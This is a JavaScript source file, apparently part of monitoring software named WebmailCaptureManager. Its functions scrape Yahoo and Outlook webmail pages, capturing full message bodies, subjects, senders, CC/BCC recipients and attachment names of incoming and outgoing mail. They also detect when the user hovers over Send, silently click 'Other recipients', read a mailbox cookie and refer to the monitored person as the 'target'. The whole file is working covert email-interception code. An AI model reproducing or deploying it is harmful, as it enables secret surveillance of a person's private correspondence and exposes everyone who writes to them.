//
//  Webmail.js
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/7/16.
//

//<Method1>
function getOutgoingYahooThread() {
    var tab_content = null;
    var tab_contents = document.getElementsByClassName('tab-content'); // make sure it's not 'tab-content offscreen'
    for (var i = 0; i < tab_contents.length; i++) {
        if (tab_contents[i].className == 'tab-content') {
            tab_content = tab_contents[i];
            break;
        }
    }
    
    var rtetext = null;
    if (tab_content != null) {
        rtetext = tab_content.getElementsByClassName('cm-rtetext undoreset fullSSL')[0]; // rtetext
    }
    
    if (rtetext != null) {
        // body message
        var body_message = rtetext.innerHTML;
        
        // recipient names, addresses
        var recipient_names = [];
        var recipient_addresses = [];
        
        var lozenge_static_xxxs = tab_content.getElementsByClassName('lozenge-static hcard cl');
        for (var i = 0; i < lozenge_static_xxxs.length; i++) {
            var recipient_name = lozenge_static_xxxs[i].innerHTML;
            var recipient_address = lozenge_static_xxxs[i].getAttribute('data-address');
            recipient_names.push(recipient_name);
            recipient_addresses.push(recipient_address);
        }
        
        // subject
        var subject = tab_content.getAttribute('data-title');
        var subject_field = tab_content.getElementsByClassName('cm-subject-field')[0];
        if (subject_field != null) { // forward case
            subject = subject_field.value;
        }
        
        // sender name, address
        var from_field = tab_content.getElementsByClassName('cm-from-field from-select')[0];
        var sender_address = from_field.options[from_field.selectedIndex].text;
        var sender_name = from_field.options[from_field.selectedIndex].text;
        if (sender_address.indexOf('<') != -1 && sender_address.indexOf('>') != -1) {
            sender_address = sender_address.substring(sender_address.indexOf('<')+1, sender_address.indexOf('>'));
            sender_name = sender_name.substring(0, sender_name.indexOf('<')-1); // without space
        }
        
        // send_date
        var d = new Date();
        var send_date = d.toString();
        
        // attachements
        var attachment_filenames = [];
        var attachments_well = tab_content.getElementsByClassName('attachments-well')[0];
        var thumbnails_attach = attachments_well.getElementsByClassName('thumbnails-attach')[0];
        var attachments = thumbnails_attach.children;
        for (var i = 0; i < attachments.length; i++) {
            var attachment = attachments[i];
            var attachement_title = attachment.title;
            attachment_filenames.push(attachement_title);
        }
        
        // create object then convert to json
        var message = {sender_name, sender_address, send_date, subject, recipient_names, recipient_addresses, body_message, attachment_filenames};
        return JSON.stringify(message);
    }
    return '';
} getOutgoingYahooThread();
//</Method1>

//<Method2>
function isYahooSendButtonInFocus() {
    var focus = false;
    
    var tab_content = null;
    var tab_contents = document.getElementsByClassName('tab-content'); // make sure it's not 'tab-content offscreen'
    for (var i = 0; i < tab_contents.length; i++) {
        if (tab_contents[i].className == 'tab-content') { // or can check attribute style='visibility: visible;'
            tab_content = tab_contents[i];
            break;
        }
    }
    
    if (tab_content != null) {
        var btn_default = tab_content.getElementsByClassName('btn default')[0];
        
        var elements = document.querySelectorAll(':hover');
        for (var i = 0; i < elements.length; i++) {
            if (elements[i] == btn_default) {
                focus = true;
                break;
            }
        }
    }
    
    return focus.toString();
} isYahooSendButtonInFocus();
//</Method2>

//<Method3>
function getOutgoingYahooThreadBasic() {
    var compose = document.getElementById('Compose');
    if (compose != null) {
        var compose_page = compose.getElementsByClassName('composepage')[0];
        
        // body message
        var row_editor_field = compose_page.getElementsByClassName('row editorfield')[0];
        var content = row_editor_field.childNodes[0];
        var body_message = content.value;
        
        // recipient names, addresses
        var recipient_names = [];
        var recipient_addresses = [];
        var to = document.getElementById('to');
        if (to.value.length > 0) {
            var array = to.value.split(',');
            for (var i = 0; i < array.length; i++) {
                var r = array[i];
                if (r.length > 0) {
                    if (r.indexOf('<') != -1 && r.indexOf('>') != -1) {
                        var r_address = r.substring(r.indexOf('<')+1, r.indexOf('>'));
                        var r_name = r.substring(0, r.indexOf('<')-1); // without space
                        recipient_names.push(r_name);
                        recipient_addresses.push(r_address);
                    } else {
                        recipient_names.push(r);
                        recipient_addresses.push(r);
                    }
                }
            }
        }
        var cc = document.getElementById('cc');
        if (cc.value.length > 0) {
            var array = cc.value.split(',');
            for (var i = 0; i < array.length; i++) {
                var r = array[i];
                if (r.length > 0) {
                    if (r.indexOf('<') != -1 && r.indexOf('>') != -1) {
                        var r_address = r.substring(r.indexOf('<')+1, r.indexOf('>'));
                        var r_name = r.substring(0, r.indexOf('<')-1); // without space
                        recipient_names.push(r_name);
                        recipient_addresses.push(r_address);
                    } else {
                        recipient_names.push(r);
                        recipient_addresses.push(r);
                    }
                }
            }
        }
        var bcc = document.getElementById('bcc');
        if (bcc.value.length > 0) {
            var array = bcc.value.split(',');
            for (var i = 0; i < array.length; i++) {
                var r = array[i];
                if (r.length > 0) {
                    if (r.indexOf('<') != -1 && r.indexOf('>') != -1) {
                        var r_address = r.substring(r.indexOf('<')+1, r.indexOf('>'));
                        var r_name = r.substring(0, r.indexOf('<')-1); // without space
                        recipient_names.push(r_name);
                        recipient_addresses.push(r_address);
                    } else {
                        recipient_names.push(r);
                        recipient_addresses.push(r);
                    }
                }
            }
        }
        
        // subject
        var subj = document.getElementById('Subj');
        var subject = subj.value;
        
        // sender name, address
        var uh_name = document.getElementsByClassName('uh-name')[0];
        var sender_name = uh_name.innerHTML;
        var def_from_address = document.getElementsByName('defFromAddress')[0];
        var sender_address = def_from_address.value;
        
        // send_date
        var d = new Date();
        var send_date = d.toString();
        
        // attachments
        var attachment_filenames = [];        
        var att_tray = compose_page.getElementsByClassName('att-tray')[0];
        var att_thumb_flow_clearfix = att_tray.getElementsByClassName('att-thumb-flow clearfix')[0];
        var attachments =  att_thumb_flow_clearfix.childNodes;
        for (var i = 0; i < attachments.length; i++) {
            var attachment = attachments[i];
            var att_name = attachment.getElementsByClassName('att-name')[0].innerHTML;
            attachment_filenames.push(att_name);
        }
        
        // create object then convert to json
        var message = {sender_name, sender_address, send_date, subject, recipient_names, recipient_addresses, body_message, attachment_filenames};
        return JSON.stringify(message);
    }
    return '';
} getOutgoingYahooThreadBasic();
//</Method3>

//<Method4>
function isYahooSendButtonInFocusBasic() {
    var focus = false;
    
    var compose = document.getElementById('Compose');
    if (compose != null) {
        var send_top = document.getElementById('send_top');
        var send_bottom = document.getElementById('send_bottom');
        
        var elements = document.querySelectorAll(':hover');
        for (var i = 0; i < elements.length; i++) {
            if (elements[i] == send_top ||
                elements[i] == send_bottom) {
                focus = true;
                break;
            }
        }
    }
    
    return focus.toString();
} isYahooSendButtonInFocusBasic();
//</Method4>

//<Method5>
function getIncomingOutlookThread() {
    // body message
    var body_message = null;
    var bodyElement = document.querySelectorAll('[id="Item.MessageUniqueBody"]');
    if (bodyElement.length > 0) {
        for (var i = 0; i < bodyElement.length; i++) {
            var bodyInnerHTML = bodyElement[i].innerHTML;
            if (bodyInnerHTML.length > 0) {
                body_message = bodyInnerHTML;
                break;
            }
        }
    }
    else {
        var popupBodyElement = document.querySelector('[aria-label="Message body"]');
        
        if (popupBodyElement!= null) {
            if (popupBodyElement.innerHTML.length > 0) {
                body_message = popupBodyElement.innerHTML;
            }
        }
    }
    //console.log(body_message);
    
    //Find array of send button to exclude reply page capture for incoming (For valid incoming email page it should have 1 or 0 element of send button)
    var send_button = document.querySelectorAll('[aria-label="Send"]');
    
    if (body_message != null && send_button.length <= 1) {
        // recipient names, addresses
        var recipient_names = [];
        var recipient_addresses = [];
        
        var otherRecipientsButton = document.querySelector('[aria-label="Other recipients"]');
        if (otherRecipientsButton != null){
            otherRecipientsButton.click();
        }
        
        var toElement = document.querySelectorAll('[autoid="_pe_b"]');
        //console.log(toElement);
        if (toElement != null) {
            for (var i = 0; i < toElement.length; i++) {
                var r = toElement[i].innerHTML;
                if (r.length > 0) {
                    if (r.indexOf('(') != -1 && r.indexOf(')') != -1) {
                        var r_address = r.substring(r.indexOf('(')+1, r.indexOf(')'));
                        var r_name = r.substring(0, r.indexOf('(')-1); // without space
                        recipient_names.push(r_name);
                        recipient_addresses.push(r_address);
                    } else {
                        recipient_names.push(r);
                        recipient_addresses.push(r);
                    }
                }
            }
        }
        //console.log(recipient_names);
        //console.log(recipient_addresses);
        
        // subject
        var subjectElement = document.querySelector('.rpHighlightAllClass.rpHighlightSubjectClass');
        //console.log(subjectElement);
        var subject = subjectElement.innerHTML;
        //console.log(subject);
        
        // sender name, address
        var senderLabel = document.querySelector('._pe_l');
        var senderNameElement = senderLabel.children[0];
        var sender_name = senderNameElement.innerHTML;
        //console.log(sender_name);
        var sender_address = sender_name;
        
        //Your name from document title
        var your_name = null;
        var title = document.title; // "Mail - MobileThree Test - Outlook"
        if (title.length > 0) {
            if (title.indexOf('-') != -1) {
                title = title.substring(title.indexOf('-')+1);
                    //console.log(title);
                your_name = title.substring(1, title.indexOf('-')-1); // without space
            }
        }
        
        if (sender_name == your_name){
            //Don't capture as incoming if sender is the same as target
            return '';
        }
        
        // received_date
        var messageHeader = document.querySelector('[aria-label="Message Headers"]');
        if (messageHeader == null) {//For popup case
            messageHeader = document.querySelector('[aria-label="Message header"]');
        }
        var allowTextSelectionElementArray = messageHeader.querySelectorAll('[class="allowTextSelection"]');
        var received_date = allowTextSelectionElementArray[0].innerHTML;
        //console.log(received_date);
        
        // attachments
        var attachment_filenames = [];
        var attachmentElement = document.querySelector('._ay_w.ms-font-m');
        //console.log(attachmentElement);
        
        if (attachmentElement) {
            for (var i = 0; i < attachmentElement.length; i++) {
                var attachment = attachmentElement[i];
                var att_name = attachment.innerHTML;
                if (att_name.length > 0) {
                    attachment_filenames.push(att_name);
                }
            }
        }
        
        // create object then convert to json
        var message = {sender_name, sender_address, received_date, subject, recipient_names, recipient_addresses, body_message, attachment_filenames};
    
        return JSON.stringify(message);
    }
    return '';
} getIncomingOutlookThread();
//</Method5>

//<Method6>
function isOutlookHasReadingPane() {
    var separatorArray = document.querySelectorAll('[role="separator"]');
    //console.log(separatorArray);
    if (separatorArray != null) {
        if (separatorArray.length > 1) {
            return true;
        }
        else {
            return false;
        }
    }
    else {
        return false;
    }
} isOutlookHasReadingPane();
//</Method6>

//<Method7>
function isOutlookSendButtonInFocus() {
    var focus = false;
    var compose = document.getElementsByClassName('allowTextSelection ConsumerCED _mcp_W1 customScrollBar ms-bg-color-white ms-font-color-black owa-font-compose')[0];
    if (compose) {
        var send_bottom = document.querySelector('[aria-label="Send"]');
        var elements = document.querySelectorAll(':hover');
        for (var i = 0; i < elements.length; i++) {
            if (elements[i].title === send_bottom.title) { // whatever focus element's title is 'Send' then it's 'Send' button
                focus = true;
                break;
            }
        }
    }
    return focus;
} isOutlookSendButtonInFocus();
//</Method7>

//<Method8>
function getOutgoingOutlookThread() {
    var compose = document.getElementsByClassName('allowTextSelection ConsumerCED _mcp_W1 customScrollBar ms-bg-color-white ms-font-color-black owa-font-compose')[0];
    if (compose != null) {
        // body message
        var body_message = compose.outerHTML;
        //console.log(body_message);
        
        // recipient names, addresses
        var recipient_names = [];
        var recipient_addresses = [];
        var to_cc_bccElement = document.getElementsByClassName('_pe_o _pe_T1 _pe_U1 allowTextSelection');
        //console.log(to_cc_bccElement);
        if (to_cc_bccElement != null) {
            for (var i = 0; i < to_cc_bccElement.length; i++) {
                var r = to_cc_bccElement[i].innerHTML;
                if (r.length > 0) {
                    if (r.indexOf('(') != -1 && r.indexOf(')') != -1) {
                        var r_address = r.substring(r.indexOf('(')+1, r.indexOf(')'));
                        var r_name = r.substring(0, r.indexOf('(')-1); // without space
                        recipient_names.push(r_name);
                        recipient_addresses.push(r_address);
                    } else {
                        recipient_names.push(r);
                        recipient_addresses.push(r);
                    }
                }
            }
        }
        //console.log(recipient_names);
        //console.log(recipient_addresses);
        
        // subject
        var subjectElement = document.querySelector('[aria-label="Subject,"]');
        //console.log(subjectElement);
        var subject = subjectElement.value;
        //console.log(subject);
        
        // sender name, address
        var sender_name = null;
        var sender_address = null;
        var title = document.title; // "Mail - MobileThree Test - Outlook"
        if (title.length > 0) {
            if (title.indexOf('-') != -1) {
                title = title.substring(title.indexOf('-')+1);
                //console.log(title);
                sender_name = title.substring(1, title.indexOf('-')-1); // without space
            }
        }
        var value = '; ' + document.cookie;
        var parts = value.split('; ' + 'DefaultAnchorMailbox' + '=');
        if (parts.length == 2) {
            sender_address = parts.pop().split(';').shift();
        }
        if (sender_name == null) { // for popup window
            sender_name = sender_address;
        }
        
        // send_date
        var d = new Date();
        var send_date = d.toString();
        
        // attachments
        var attachment_filenames = [];
        var attachmentElement = document.getElementsByClassName('_ay_w ms-font-m');
        if (attachmentElement) {
            for (var i = 0; i < attachmentElement.length; i++) {
                var attachment = attachmentElement[i];
                var att_name = attachment.innerHTML;
                if (att_name.length > 0) {
                    attachment_filenames.push(att_name);
                }
            }
        }
        //console.log(attachment_filenames);
        
        // create object then convert to json
        var message = {sender_name, sender_address, send_date, subject, recipient_names, recipient_addresses, body_message, attachment_filenames};
        return JSON.stringify(message);
    }
    return '';
} getOutgoingOutlookThread();
//</Method8>
